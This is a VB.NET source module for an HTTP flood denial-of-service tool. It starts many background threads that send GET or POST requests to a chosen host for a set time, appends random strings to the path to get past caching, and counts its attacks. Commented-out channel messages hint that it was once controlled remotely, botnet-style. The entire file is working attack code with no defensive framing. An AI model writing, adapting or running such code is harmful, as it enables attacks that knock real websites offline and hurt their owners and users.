Imports System.Threading
Module HTTP
    Private ThreadsEnded = 0
    ' Private _Delay As Integer
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private attacks As Integer = 0
    Private method As String
    Private PostDATA As String
    Public Sub StartBandwidthFlood(ByVal Host As String, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal methods As String, ByVal data As String)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = Host
            method = methods
            ThreadstoUse = Threadsto
            TimetoAttack = Time
            PostDATA = data
            Threads = New Thread(Threadsto - 1) {}
            Mainmenu.changeStatus("HTTP attack")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            'Form1.TalkChannel("A Bandwidth Flood Attack is Already Running on " & HostToAttack)
        End If

    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            'Form1.TalkChannel("Bandwidth Flood on " & HostToAttack & " finished successfully, downloading the file " & attacks.ToString & " times.")
            attacks = 0
        End If

    End Sub

    Public Sub StopBandwidthFlood()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            'Form1.TalkChannel("Bandwidth Flood on " & HostToAttack & " aborted successfully, downloading the file " & attacks.ToString & " times.")
            attacks = 0
        Else
            'Form1.TalkChannel("No Bandwidth Flood Attack is Running!")
        End If
    End Sub
    Public Function GenerateRandomString(ByRef len As Integer, ByRef upper As Boolean) As String
        Dim rand As New Random()
        Dim allowableChars() As Char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ0123456789".ToCharArray()
        Dim final As String = String.Empty
        For i As Integer = 0 To len - 1
            final += allowableChars(rand.Next(allowableChars.Length - 1))
        Next

        Return IIf(upper, final.ToUpper(), final)
    End Function
    Private Sub DoWork()
        Dim file As String = ""
        Try
            Dim lol As New System.Net.WebClient()
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Do While (stopwatch.Elapsed < span)
                Try
                    If Mainmenu.Append_chchbox.Checked Then
                        file = GenerateRandomString(5, True)
                    End If
                    If method = "GET" Then
                        lol.DownloadString(HostToAttack & "/" & file)
                    Else
                        lol.UploadString(HostToAttack & "/" & file, PostDATA)
                    End If

                    attacks = attacks + 1
                    lol.Dispose()
                    Continue Do
                Catch

                    Continue Do
                End Try
            Loop
        Catch : End Try
        lol()
    End Sub
End Module
